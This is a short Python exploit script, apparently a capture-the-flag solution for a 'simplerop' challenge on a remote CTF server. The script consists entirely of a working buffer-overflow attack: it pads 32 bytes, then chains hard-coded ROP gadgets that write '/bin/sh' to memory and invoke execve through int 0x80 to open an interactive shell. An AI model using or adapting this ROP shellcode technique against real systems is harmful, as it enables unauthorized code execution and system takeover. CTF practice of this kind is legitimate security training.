#!/bin/env python2
from pwn import *

#p = process('./simplerop')
p = remote('csie.ctf.tw', 10140)

payload = 'a'*32

buf = 0x080ea060
mov_dedx_eax = 0x0809a15d
pop_eax = 0x080bae06
pop_edx = 0x0806e82a
pop_edx_ecx_ebx = 0x0806e850
int_80 = 0x080493e1

rop = flat(pop_edx, buf, pop_eax, '/bin', mov_dedx_eax)
rop += flat(pop_edx, buf+4, pop_eax, '/sh\x00', mov_dedx_eax)
rop += flat(pop_edx_ecx_ebx, 0, 0, buf, pop_eax, 0xb, int_80)

payload += rop
p.sendline(payload)
p.interactive()
